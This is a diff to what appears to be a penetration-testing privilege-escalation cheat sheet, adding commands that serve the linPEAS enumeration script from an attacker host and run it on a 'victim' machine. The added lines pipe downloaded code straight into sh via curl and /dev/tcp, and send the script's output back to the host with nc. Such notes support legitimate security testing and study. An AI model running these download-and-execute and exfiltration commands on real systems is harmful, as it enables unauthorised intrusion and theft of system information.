@@ -6,6 +6,20 @@
     - LinEnum - [Link](https://github.com/rebootuser/LinEnum)
     - LinpPeas - [Link](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)
 
+```console
+# Local network
+sudo python -m SimpleHTTPServer 80 #Host
+curl 10.10.10.10/linpeas.sh | sh #Victim
+
+# Without curl
+sudo nc -q 5 -lvnp 80 < linpeas.sh #Host
+cat < /dev/tcp/10.10.10.10/80 | sh #Victim
+
+# Excute from memory and send output back to the host
+nc -lvnp 9002 | tee linpeas.out #Host
+curl 10.10.14.20:8000/linpeas.sh | sh | nc 10.10.14.20 9002 #Victim
+```
+
 - sudo -l
 
 Take a look at the variables like **LD_PRELOAD**
